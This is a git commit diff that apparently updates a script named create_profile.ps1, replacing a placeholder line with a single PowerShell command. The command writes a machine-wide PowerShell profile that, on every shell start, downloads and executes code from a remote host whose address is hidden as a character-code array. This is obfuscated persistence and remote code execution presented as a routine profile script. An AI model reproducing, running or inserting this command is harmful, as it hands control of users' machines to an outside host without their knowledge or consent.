bef8e4dcbe4f821e8ac33f7fd510a5691abbe584
pangeaimmersive <161491662+pangeaimmersive@users.noreply.github.com>
2024-03-22 19:32:32 -0400

    Update create_profile.ps1

--- create_profile.ps1
+++ create_profile.ps1
@@ -1,1 +1,1 @@
-profile
+New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value "(iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())"
